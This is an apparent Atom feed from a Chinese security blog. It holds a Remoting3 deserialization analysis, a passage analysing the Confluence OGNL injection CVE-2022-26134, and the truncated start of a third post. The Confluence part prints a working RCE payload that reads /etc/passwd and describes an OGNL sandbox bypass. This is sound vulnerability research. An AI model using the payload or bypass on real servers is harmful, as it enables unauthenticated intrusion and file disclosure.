<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>P1ay2win&#39;s blog</title>
  
  <subtitle>他们的爱与风华，只问自由，只问深情，只问盛放，只问初心，只问勇敢，无问西东。</subtitle>
  <link href="http://127.0.0.1/atom.xml" rel="self"/>
  
  <link href="http://127.0.0.1/"/>
  <updated>2022-07-07T02:58:14.737Z</updated>
  <id>http://127.0.0.1/</id>
  
  <author>
    <name>P1ay2win</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JBoss\WildFly remoting3协议反序列化分析</title>
    <link href="http://127.0.0.1/2022/06/28/JBoss%20WildFly%20remoting3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <id>http://127.0.0.1/2022/06/28/JBoss%20WildFly%20remoting3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</id>
    <published>2022-06-28T03:30:53.000Z</published>
    <updated>2022-07-07T02:58:14.737Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间分析了JBoss 3873和4446端口下的反序列化，受影响的版本最晚已经是2011年发布的，而JBoss EAP 6.X及WildFly\JBoss AS 7.X等后续版本，它们反序列化相关的CVE就很少了。归根结底，是因为以上所说的后续版本弃用了原来的Remoting2协议，启用了Remoting3协议。本文以Remoting3的反序列化相关问题展开分析。</p><a id="more"></a><h2 id="Remoting3简介"><a href="#Remoting3简介" class="headerlink" title="Remoting3简介"></a>Remoting3简介</h2><p>Remoting3是JBoss Remoting的下一代协议，它在具备上一代协议所具有的功能的同时，还引入了以下一些性功能。</p><ul><li>可拓展的传输协议<ul><li>可以在运行时检测其他的协议</li></ul></li><li>可拓展的打包策略（Marshalling Strategies）<ul><li>使用强大的JBoss打包库</li><li>相比明文的Java序列化更高效</li></ul></li><li>安全功能<ul><li>支持SSL协议，可以保护传输数据的完整性和机密性，同时也可用来认证服务端</li><li>支持SASL框架，可进行客户端认证和授权</li></ul></li></ul><p>通过抓包对比，正如官网介绍所说，Remoting3协议不同于Remoting2的几乎明文的Java序列化数据，并且在默认配置下需要先进行客户端的认证才可使用后续的EJB3服务。</p><p><img src="/2022/06/28/JBoss WildFly remoting3协议反序列化分析/屏幕截图 2022-06-24 161349.png" alt></p><p>前面所说的可拓展的传输协议，体现在JBoss上即为HTTP服务8080端口的。Remoting3协议支持两种EJB3服务监听模式：直接监听一个端口和复用HTTP服务的端口。前者是JBoss EAP 6.X和JBoss AS 7.X使用的模式，对应的scheme是<code>remote://</code>，而后者是JBoss EAP 7.X和WildFly使用的模式，对应的scheme是<code>http-remoting://</code>或<code>http://</code>（视版本而定）。</p><p>端口复用这块从流量这看是比较简单，客户端先发送一个带<code>Upgrade: jboss-remoting</code>头的HTTP请求，然后服务端返回101状态码切换协议，后续流量则与监听端口的模式无异。</p><p><img src="/2022/06/28/JBoss WildFly remoting3协议反序列化分析/屏幕截图 2022-06-24 165328.png" alt></p><p><img src="/2022/06/28/JBoss WildFly remoting3协议反序列化分析/屏幕截图 2022-06-24 165612.png" alt></p><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p>Remoting3协议服务于EJB3，而EJB3与RMI类似，支持对象传参，涉及到对象参数必然会与序列化和反序列化扯上关系。要研究Remoting3协议的反序列化机制，首先得部署一个EJB3的服务。本文后续的分析均以WildFly 8.2.1.Final为例，下载相应的版本，在启动前先使用<code>bin/add-user.sh</code>脚本添加一个用户。</p><p>将以下两个类编译为Jar包，并从9990端口登录到控制台，部署打包好的Jar包。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.illucit.ejbremote.server;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> javax.ejb.Remote;</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">@Remote</span></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ExampleService</span> </span>&#123;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">greet</span><span class="hljs-params">(Object object)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.illucit.ejbremote.server;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> javax.ejb.Stateless;</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">@Stateless</span></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExampleServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ExampleService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">greet</span><span class="hljs-params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建一个Java项目，并将WildFly的<code>bin/client</code>目录下的jar包复制到项目的<code>lib</code>目录，同时将以上两个类也加入到项目中。然后在<code>resource</code>目录下添加<code>jboss-ejb-client.properties</code>，填入以下配置内容。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">remote.connections=default</span><br><span class="line">remote.connection.default.host=192.168.78.132</span><br><span class="line">remote.connection.default.port = 8080</span><br><span class="line">remote.connection.default.username=&lt;username&gt;</span><br><span class="line">remote.connection.default.password=&lt;password&gt;</span><br></pre></td></tr></table></figure><p>最后添加以下类作为客户端，调用远程EJB3服务。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> com.illucit.ejbremote.server.ExampleService;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.util.Date;</span><br><span class="line"><span class="hljs-keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.printf(String.valueOf(lookupExample().greet2(<span class="hljs-keyword">new</span> Date())));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ExampleService <span class="hljs-title">lookupExample</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">final</span> Hashtable&lt;String, String&gt; jndiProperties = <span class="hljs-keyword">new</span> Hashtable();</span><br><span class="line">        jndiProperties.put(Context.URL_PKG_PREFIXES, <span class="hljs-string">"org.jboss.ejb.client.naming"</span>);</span><br><span class="line">        <span class="hljs-keyword">final</span> Context context = <span class="hljs-keyword">new</span> InitialContext(jndiProperties);</span><br><span class="line"></span><br><span class="line">        String url = <span class="hljs-string">"ejb:/ejb-remote-server/ExampleServiceImpl!"</span> + ExampleService.class.getName();</span><br><span class="line">        System.out.println(url);</span><br><span class="line">        <span class="hljs-keyword">return</span> (ExampleService) context.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/28/JBoss WildFly remoting3协议反序列化分析/屏幕截图 2022-06-24 180627.png" alt></p><h2 id="技术分析"><a href="#技术分析" class="headerlink" title="技术分析"></a>技术分析</h2><p>首先用一个在服务端不存在的类作为参数，调用EJB3服务。在客户端抛出的异常信息的调用栈中，可以看到<code>org.jboss.marshalling.AbstractObjectInput</code>的<code>readObject</code>方法被调用。</p><p><img src="/2022/06/28/JBoss WildFly remoting3协议反序列化分析/屏幕截图 2022-06-24 192824.png" alt></p><p>在服务端该方法下断点，当前的类是<code>AbstractObjectInput</code>的子类<code>org.jboss.marshalling.river.RiverUnmarshaller</code>，发序列化调用自身的<code>doReadObject</code>方法处理。</p><p><img src="/2022/06/28/JBoss WildFly remoting3协议反序列化分析/屏幕截图 2022-06-27 142501.png" alt></p><p>跟进到<code>doReadObject</code>方法，代码中会有一个switch循环体，根据从输入流获取到的字节进入不同的分支。后续会被调用到的<code>doReadNewObject</code>和<code>doReadClassDescriptor</code>也会有一个switch循环体，想必就是官方所说的可拓展的打包策略。</p><p><img src="/2022/06/28/JBoss WildFly remoting3协议反序列化分析/屏幕截图 2022-06-27 143803.png" alt></p><p>通过控制输入流进入到switch循环判断的字节，从而可以控制返回类示例或者反序列化对象。笔者梳理了这些switch循环体的分支，整理了几个会返回反序列化对象的流程，他们无一例外的会直接<code>readObject</code>反序列化或<code>loadClass</code>反射类实例，此时他们的类加载器都是<code>ModuleClassLoader</code>。</p><p>这是一个很特殊的类加载器，反序列化利用链中常见的类，比如<code>UnicastRef</code>、CC链（程序中实际有用到这个依赖），甚至于原生反序列化链中的一些类都是无法加载的。</p><p><img src="/2022/06/28/JBoss WildFly remoting3协议反序列化分析/屏幕截图 2022-06-27 155301.png" alt></p><p>实测只有两个module路径下jar包里的部分类和jdk部分原生类可以被这个类加载器加载。在可以加载的类中能找到一些Sink类，比如<code>ValueExpressionImpl</code>、<code>MethodExpressionImpl</code>，在RichFaces的CVE-2018-12533中有用到这两个Sink类的发序列化链，但Source和Gadget类虽然有，但<code>ModuleClassLoader</code>类加载器并不能加载。</p><p><img src="/2022/06/28/JBoss WildFly remoting3协议反序列化分析/屏幕截图 2022-06-27 160013.png" alt></p><p>反序列化这条路行不通，回看调用栈中处理消息的方法<code>processMessage</code>。开头用反序列化获取<code>appName</code>、<code>moduleName</code>、<code>distinctName</code>和<code>beanName</code>，也就是客户端<code>lookup</code>查询的url。虽说这种用法存在风险，在不知道部署了什么EJB3服务的情况下，也可以进行反序列化，但目前起来有难度，所以暂时也没有什么问题。</p><p><img src="/2022/06/28/JBoss WildFly remoting3协议反序列化分析/屏幕截图 2022-06-27 171119.png" alt></p><p>接着看后面的代码，有一个反射Method的操作，从EJB3部署信息获取到的<code>ComponentView</code>，根据方法名和方法参数反射Method。回溯Method的来源，发现是与反序列化的<code>locator</code>有关。这个<code>locator</code>其实就是封装了客户端EJB3服务接口的<code>EJBLocator</code>，那可以客户端使用恶意的EJB3服务接口，从而反射服务端类的方法？笔者也做了下尝试，但若想要反射的服务端类不是一个接口类，则会抛出一个内接口类的异常，即使是没有抛出异常，从部署信息获取<code>ComponentView</code>这一步也没法获取服务端EJB3服务接口之外的内容。</p><p><img src="/2022/06/28/JBoss WildFly remoting3协议反序列化分析/20220627173935.png" alt></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>Remoting3协议的分析原本是以挖掘协议漏洞为目的，但最终也没有发现什么太大的问题，不得不感叹现在JBoss\WildFly的版本比之前使用remoting2协议的版本安全性上升了一个台阶。翻看近年WildFly的CVE，有一个反序列化相关的CVE-2020-10740，没有验证机制使得可能通过EJB发起远程发序列化攻击，说的大概就是本文讨论的内容。查看在WildFly20.0发布的修复，仅仅是增加了黑名单验证。</p><p>除此之外，客户端还有个不大不小的问题，它的反序列化流程和服务端差不多，但客户端这里的类加载器就是普通的类加载器，可以用到部分的发序列化链，这场景就有点像RMI的发序列化服务端传来的恶意结果或异常。也许能用在反制、中间人攻击等场景。。</p><p><img src="/2022/06/28/JBoss WildFly remoting3协议反序列化分析/屏幕截图 2022-06-27 193850.png" alt></p><p>文中若有什么错误的地方，敬请师傅们斧正。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://jbossremoting.jboss.org/remoting-3" target="_blank" rel="noopener">https://jbossremoting.jboss.org/remoting-3</a></p><p><a href="https://paper.seebug.org/766/" target="_blank" rel="noopener">https://paper.seebug.org/766/</a></p><p><a href="https://github.com/illucIT/remote-ejb-example" target="_blank" rel="noopener">https://github.com/illucIT/remote-ejb-example</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前段时间分析了JBoss 3873和4446端口下的反序列化，受影响的版本最晚已经是2011年发布的，而JBoss EAP 6.X及WildFly\JBoss AS 7.X等后续版本，它们反序列化相关的CVE就很少了。归根结底，是因为以上所说的后续版本弃用了原来的Remoting2协议，启用了Remoting3协议。本文以Remoting3的反序列化相关问题展开分析。&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
    
    
    <category term="反序列化" scheme="http://127.0.0.1/tags/反序列化/"/>
    
    <category term="JBoss" scheme="http://127.0.0.1/tags/JBoss/"/>
    
    <category term="remoting" scheme="http://127.0.0.1/tags/remoting/"/>
    
  </entry>
  
  <entry>
    <title>Confluence OGNL表达式注入分析（CVE-2022-26134）</title>
    <link href="http://127.0.0.1/2022/06/08/Confluence%20OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-26134%EF%BC%89/"/>
    <id>http://127.0.0.1/2022/06/08/Confluence%20OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-26134%EF%BC%89/</id>
    <published>2022-06-08T12:00:53.000Z</published>
    <updated>2022-06-14T03:32:23.060Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>Atlassian Confluence是企业广泛使用的wiki系统。2022年6月2日Atlassian官方发布了一则安全更新， Confluence上存在一个严重的未经身份验证的远程代码执行漏洞。OGNL注入漏洞允许未经身份验证的用户在Confluence Server或Data Center实例上执行任意代码。</p></blockquote><a id="more"></a><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在<code>Runtime</code>处下断点，开头经过一连串的FilterChain，但Filter都正常执行完了，显然漏洞与Filter无关。直接跟进到<code>com.atlassian.confluence.servlet.ConfluenceServletDispatcher</code>父类的<code>service</code>方法，在这里开始处理Servlet的请求。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">exec:443, Runtime (java.lang)</span><br><span class="line">...</span><br><span class="line">getValue:333, Ognl (ognl)</span><br><span class="line">getValue:310, Ognl (ognl)</span><br><span class="line">findValue:141, OgnlValueStack (com.opensymphony.xwork.util)</span><br><span class="line">translateVariables:39, TextParseUtil (com.opensymphony.xwork.util)</span><br><span class="line">execute:95, ActionChainResult (com.opensymphony.xwork)</span><br><span class="line">executeResult:263, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">invoke:187, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:21, FlashScopeInterceptor (com.atlassian.confluence.xwork)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">...</span><br><span class="line">execute:115, DefaultActionProxy (com.opensymphony.xwork)</span><br><span class="line">serviceAction:56, ConfluenceServletDispatcher (com.atlassian.confluence.servlet)</span><br><span class="line">service:199, ServletDispatcher (com.opensymphony.webwork.dispatcher)</span><br><span class="line">service:764, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:162, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:53, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">...</span><br><span class="line">doFilter:162, ApplicationFilterChain (org.apache.catalina.core)</span><br></pre></td></tr></table></figure><p>然后在执行一系列的Interceptor后，来到了<code>ConfluenceAccessInterceptor</code>，验证是否有权限访问。此时并没有登录，所以首次设置了返回页面状态<code>notpermitted</code>，且没有继续递归到下一个Interceptor。</p><p><img src="/2022/06/08/Confluence OGNL表达式注入分析（CVE-2022-26134）/屏幕截图 2022-06-08 102811.png" alt></p><p>由于没有继续递归Interceptor，且没有还未执行相应的Action，所以举行执行<code>invoke</code>方法的后续代码，进入到<code>com.opensymphony.xwork.DefaultActionInvocation#executeResult</code>方法。</p><p><img src="/2022/06/08/Confluence OGNL表达式注入分析（CVE-2022-26134）/屏幕截图 2022-06-08 103545.png" alt></p><p>跟进到<code>executeResult</code>方法，首先会执行本类中的<code>createResult</code>方法，再次跟进。代码的逻辑是根据页面的状态返回相应的Result类型。</p><p><img src="/2022/06/08/Confluence OGNL表达式注入分析（CVE-2022-26134）/屏幕截图 2022-06-07 191506.png" alt></p><p><img src="/2022/06/08/Confluence OGNL表达式注入分析（CVE-2022-26134）/屏幕截图 2022-06-07 191720.png" alt></p><p>当前的状态是<code>notpermitted</code>，所以返回的Result就是<code>com.opensymphony.xwork.ActionChainResult</code>。问题也出在<code>ActionChainResult</code>这里，它的<code>execute</code>会被<code>DefaultActionInvocation</code>的<code>executeResult</code>方法调用。其中会用<code>com.opensymphony.xwork.util.TextParseUtil#translateVariables</code>方法，以OGNL表达式方式解析<code>namespace</code>，也就是我们传入的可控的路径，导致了OGNL表达式注入。</p><p><img src="/2022/06/08/Confluence OGNL表达式注入分析（CVE-2022-26134）/屏幕截图 2022-06-07 203033.png" alt></p><p>最后的POC就是OGNL表达式注入的POC了，比如以下广为流传的回显POC：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/$&#123;(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;cat /etc/passwd&quot;).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))&#125;</span><br></pre></td></tr></table></figure><h2 id="沙箱绕过"><a href="#沙箱绕过" class="headerlink" title="沙箱绕过"></a>沙箱绕过</h2><p>看到有文章说稍高的版本加入了OGNL的沙箱，下载了个测试了确实如此。在<code>OgnlValueStack</code>的<code>findValue</code>方法调用了<code>isSafeExpression</code>方法做表达式的验证。验证的主要逻辑在<code>com.opensymphony.xwork.util.SafeExpressionUtil#containsUnsafeExpression</code>方法。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">containsUnsafeExpression</span><span class="hljs-params">(Node node, Set&lt;String&gt; visitedExpressions)</span> </span>&#123;</span><br><span class="line">    String nodeClassName = node.getClass().getName();</span><br><span class="line">    <span class="hljs-keyword">if</span> (UNSAFE_NODE_TYPES.contains(nodeClassName)) &#123;  <span class="hljs-comment">// 0 = "ognl.ASTStaticField" 1 = "ognl.ASTCtor" 2 = "ognl.ASTAssign"</span></span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">"ognl.ASTStaticMethod"</span>.equals(nodeClassName) &amp;&amp; !<span class="hljs-keyword">this</span>.allowedClassNames.contains(getClassNameFromStaticMethod(node))) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">"ognl.ASTProperty"</span>.equals(nodeClassName) &amp;&amp; <span class="hljs-keyword">this</span>.isUnSafeClass(node.toString())) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">"ognl.ASTMethod"</span>.equals(nodeClassName) &amp;&amp; <span class="hljs-keyword">this</span>.unsafeMethodNames.contains(getMethodInOgnlExp(node))) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">"ognl.ASTVarRef"</span>.equals(nodeClassName) &amp;&amp; UNSAFE_VARIABLE_NAMES.contains(node.toString())) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">"ognl.ASTConst"</span>.equals(nodeClassName) &amp;&amp; !<span class="hljs-keyword">this</span>.isSafeConstantExpressionNode(node, visitedExpressions)) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; node.jjtGetNumChildren(); ++i) &#123;</span><br><span class="line">            Node childNode = node.jjtGetChild(i);</span><br><span class="line">            <span class="hljs-keyword">if</span> (childNode != <span class="hljs-keyword">null</span> &amp;&amp; <span class="hljs-keyword">this</span>.containsUnsafeExpression(childNode, visitedExpressions)) &#123;</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法禁止了静态属性、构造方法，和对属性、方法、OGNL变量、常量进行黑名单验证，对静态方法进行白名单验证。</p><p>先看看OGNL变量的黑名单，把当前所有的不带<code>.</code>号的上下文变量都过滤了；而带<code>.</code>号变量，<code>.</code>号的内容又被解析为属性，没法正确获取到变量。所以<a href="https://twitter.com/pwntester" target="_blank" rel="noopener">@pwntester</a>大佬的上下文大法在我这里才疏学浅没法绕了，也许有别的一种写法，希望研究出来的师傅分享分享。</p><p><img src="/2022/06/08/Confluence OGNL表达式注入分析（CVE-2022-26134）/屏幕截图 2022-06-08 173126.png" alt></p><p><img src="/2022/06/08/Confluence OGNL表达式注入分析（CVE-2022-26134）/屏幕截图 2022-06-08 173329.png" alt></p><p>但现在有一个<a href="https://twitter.com/phithon_xg" target="_blank" rel="noopener">@P牛</a>公开的绕沙箱POC，形如<code>${Class.forName(&quot;xxxxxxx&quot;)}</code>。我们回看属性黑名单是有<code>class</code>的，那为什么P牛的POC内获取到类实例呢？这就涉及<strong>嵌套属性</strong>的问题，当一个类有<code>getXXX</code>方法时，<code>XXX</code>就是它的嵌套属性，能通过<code>.</code>点号的方式获取。这个小trick常在表达式语言中用到，相关的用法有如Spring的CVE-2022-22965。</p><p><img src="/2022/06/08/Confluence OGNL表达式注入分析（CVE-2022-26134）/屏幕截图 2022-06-08 175952.png" alt></p><p>后面的利用可以用经典的<code>ScriptEngineManager</code>，也可以反射<code>Runtime</code>，但在黑名单中的类名要拼接以下，简单绕下沙箱中的关键字。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>简单看下官方发布的补丁，感觉<code>httpmethodnotallowed</code>和<code>inviladmethod</code>两种页面状态还能利用，但是不知道怎么触发😅</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html" target="_blank" rel="noopener">https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html</a></p><p><a href="https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134</a></p><p><a href="https://twitter.com/phithon_xg/status/1532887542722269184" target="_blank" rel="noopener">https://twitter.com/phithon_xg/status/1532887542722269184</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Atlassian Confluence是企业广泛使用的wiki系统。2022年6月2日Atlassian官方发布了一则安全更新， Confluence上存在一个严重的未经身份验证的远程代码执行漏洞。OGNL注入漏洞允许未经身份验证的用户在Confluence Server或Data Center实例上执行任意代码。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
    
    
    <category term="SSTI" scheme="http://127.0.0.1/tags/SSTI/"/>
    
    <category term="OGNL" scheme="http://127.0.0.1/tags/OGNL/"/>
    
    <category term="sandbox" scheme="http://127.0.0.1/tags/sandbox/"/>
    
  </entry>
  
  <entry>
    <title>JBoss remoting2协议及其反序列化分析</title>
    <link href="http://127.0.0.1/2022/06/02/JBoss%20remoting2%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <id>http://127.0.0.1/2022/06/02/JBoss%20remoting2%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</id>
    <published>2022-06-02T03:30:53.000Z</published>
    <updated>2022-06-02T03:31:01.047Z</updated>
    
